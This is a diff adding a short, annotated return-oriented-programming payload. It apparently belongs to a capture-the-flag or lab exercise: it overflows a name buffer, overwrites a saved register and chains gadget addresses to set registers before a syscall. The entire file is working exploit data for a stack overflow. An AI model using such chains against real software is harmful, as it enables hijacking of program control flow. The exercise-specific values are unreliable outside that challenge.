@@ -1,0 +1,13 @@
+0x4141414141414141 fill name buffer
+0x4141414141414141 fill name buffer
+0x4141414141414141 fill name buffer
+0x4141414141414141 fill name buffer
+0x4141414141414100 fill overwrite saved register
+0x000055555555543b jump to popping into rdx
+0x006e69656d74656c rcx value for rdx
+0x0000555555555452 jump to moving rdx into rcx
+0x000055555555545b jump to popping into rbx
+0x7d6e77707b707868 rbx value
+0x000055555555544b jump to popping into rax
+0x0000000042421337 rax value
+0x0000555555555445 jump to syscall
